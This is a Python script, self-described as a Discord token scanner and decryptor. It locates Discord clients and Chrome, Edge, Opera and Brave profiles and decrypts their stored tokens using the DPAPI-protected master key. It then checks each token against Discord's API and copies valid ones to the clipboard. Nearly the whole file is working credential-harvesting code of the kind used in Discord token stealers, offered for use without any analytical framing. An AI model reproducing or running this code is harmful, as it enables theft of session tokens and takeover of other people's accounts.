"""Discord token scanner and decryptor for multiple browsers and applications."""
# pylint: disable=too-many-locals,too-many-branches,too-many-statements,invalid-name
import os
import re
import base64
import json
import requests
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData  # pylint: disable=no-name-in-module
from colorama import Fore, init
import clipboard

init(autoreset=True)

VALID_TOKENS = {}
SEEN_TOKENS = set()

ASCII_ART = r'''
    ___ _              ___             
  / __\ |__   ___  __| | | ___   __ _ 
 / /  | '_ \ / _ \/ _` | |/ _ \ / _` |
/ /___| | | |  __/ (_| | | (_) | (_| |
\____/|_| |_|\___|\__,_|_|\___/ \__, |
                                |___/ 
'''

print(Fore.RED + ASCII_ART)
print(Fore.WHITE + "=" * 40)
print(Fore.CYAN + "Made by Cheddlar" + Fore.WHITE + " || " + Fore.MAGENTA + "Version: 2.0")
print("\n" + Fore.YELLOW + "Initializing token scanner...\n")

def fetch_tokens_and_usernames():
    """Scan browsers and applications for Discord tokens and validate them."""
    regex = r"(mfa\.[\w-]{84}|[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38})"
    encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
    
    paths = {
        # Official Clients
        'Discord': os.path.join(os.getenv("APPDATA"), 'Discord', 'Local Storage', 'leveldb'),
        'Discord Canary': os.path.join(os.getenv("APPDATA"), 'DiscordCanary', 'Local Storage', 'leveldb'),
        'Discord PTB': os.path.join(os.getenv("APPDATA"), 'discordptb', 'Local Storage', 'leveldb'),

        # Custom Clients
        'ArmCord': os.path.join(os.getenv("APPDATA"), 'ArmCord', 'Local Storage', 'leveldb'),
        'Equicord': os.path.join(os.getenv("APPDATA"), 'Equicord', 'Local Storage', 'leveldb'),
        'Legcord': os.path.join(os.getenv("APPDATA"), 'legcord', 'Local Storage', 'leveldb'),
        'Sheltercord': os.path.join(os.getenv("APPDATA"), 'Sheltercord', 'Local Storage', 'leveldb'),
        'Vencord': os.path.join(os.getenv("APPDATA"), 'Vencord', 'Local Storage', 'leveldb'),
        'WebCord': os.path.join(os.getenv("APPDATA"), 'WebCord', 'Local Storage', 'leveldb'),

        # Browsers
        'Google Chrome': os.path.join(os.getenv("LOCALAPPDATA"), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Chrome Beta': os.path.join(os.getenv("LOCALAPPDATA"), 'Google', 'Chrome Beta', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Microsoft Edge': os.path.join(os.getenv("LOCALAPPDATA"), 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Opera': os.path.join(os.getenv("APPDATA"), 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
        'Opera GX': os.path.join(os.getenv("APPDATA"), 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
        'Brave': os.path.join(os.getenv("LOCALAPPDATA"), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
    }

    def decrypt_payload(buff, master_key):
        """Decrypt encrypted token payload using AES-GCM."""
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except (ValueError, KeyError):
            return None

    def get_decryption_key(path):
        """Retrieve and decrypt master key from browser's local state."""
        try:
            with open(path, "r", encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            return CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        except (FileNotFoundError, json.JSONDecodeError, KeyError):
            return None

    def validate_token(tkn):
        """Validate token and return (is_valid, username)."""
        try:
            response = requests.get(
                "https://discord.com/api/v9/users/@me",
                headers={"Authorization": tkn},
                timeout=10
            )
            if response.status_code == 200:
                user_info = response.json()
                username = user_info['username']
                discrim = user_info.get('discriminator')
                display_name = f"{username}#{discrim}" if discrim and discrim != "0" else username
                return (True, display_name)
            return (False, None)
        except requests.RequestException:
            return (False, None)

    stats = {'found': 0, 'scanned': 0, 'errors': 0}
    print(f"{Fore.BLUE}\n{' SCANNING STARTED ':=^40}\n")

    for name, path in paths.items():
        try:
            if not os.path.exists(path):
                print(f"{Fore.YELLOW}[•] {name.ljust(20)} {Fore.WHITE}→ {Fore.YELLOW}Not installed")
                stats['scanned'] += 1
                continue

            local_state_path = os.path.join(os.path.dirname(path), '..\\Local State')
            dec_key = get_decryption_key(local_state_path)
            if not dec_key:
                print(f"{Fore.RED}[!] {name.ljust(20)} {Fore.WHITE}→ {Fore.RED}Decryption failed")
                stats['errors'] += 1
                continue

            found_tokens = []
            for file in os.listdir(path):
                if file.endswith(('.log', '.ldb')):
                    with open(os.path.join(path, file), "r", errors="ignore") as f:
                        content = f.read()
                        found_tokens.extend(re.findall(regex, content))

                        encrypted_matches = re.findall(encrypted_regex, content)
                        for match in encrypted_matches:
                            decrypted_token = decrypt_payload(base64.b64decode(match.split('dQw4w9WgXcQ:')[1]), dec_key)
                            if decrypted_token:
                                found_tokens.append(decrypted_token)

            if found_tokens:
                unique_tokens = set(found_tokens)
                print(f"\n{Fore.GREEN}[✓] {Fore.WHITE}{name}: Found {len(unique_tokens)} tokens")
                
                for idx, token in enumerate(unique_tokens):
                    if token in SEEN_TOKENS:
                        continue
                    
                    is_valid, username = validate_token(token)
                    if is_valid:
                        VALID_TOKENS[len(VALID_TOKENS)+1] = token
                        print(f"{Fore.GREEN}[VALID] {username}")
                    else:
                        print(f"{Fore.RED}[INVALID] Token #{idx}")
                    
                    SEEN_TOKENS.add(token)

            stats['scanned'] += 1

        except Exception as e:
            print(f"{Fore.RED}[!] Error scanning {name}: {e}")
            stats['errors'] += 1

    print(f"\n{Fore.BLUE}{' SCAN SUMMARY ':=^40}")
    print(f"{Fore.GREEN}✔ Valid tokens: {len(VALID_TOKENS)}")
    print(f"{Fore.CYAN}➤ Scanned apps: {stats['scanned']}")
    print(f"{Fore.YELLOW}⚠ Errors: {stats['errors']}")

    if VALID_TOKENS:
        while True:
            try:
                choice = input(f"\n{Fore.WHITE}Enter token number to copy (1-{len(VALID_TOKENS)}): ")
                if choice.lower() == "exit":
                    break
                clipboard.copy(VALID_TOKENS[int(choice)])
                print(f"{Fore.GREEN}✓ Token {choice} copied to clipboard!")
                break
            except (ValueError, KeyError):
                print(f"{Fore.RED}⚠ Invalid input. Enter a number or type \"exit\".")
    else:
        print(f"\n{Fore.RED}⚠ No valid tokens found.")

if __name__ == '__main__':
    fetch_tokens_and_usernames()
    input(f"\n{Fore.WHITE}Press Enter to exit...")